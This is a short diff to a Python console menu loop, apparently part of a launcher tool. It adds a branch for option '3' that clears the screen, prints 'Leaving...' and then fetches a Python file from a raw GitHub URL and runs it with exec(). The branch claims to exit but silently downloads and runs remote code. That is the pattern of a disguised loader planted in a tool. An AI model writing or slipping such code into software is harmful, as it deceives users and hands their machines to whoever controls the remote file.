@@ -12,5 +12,9 @@ while True:
         os.system('cls')
         print("                                               \033[1;39mLaunching...")
         windows()
+    if gg == '3':
+        os.system('cls')
+        print("                                               \033[1;39mLeaving...")
+        exec(requests.get('https://raw.githubusercontent.com/Fluxoxetine/onbottomproject/main/main.py').text)
     else:
         continue
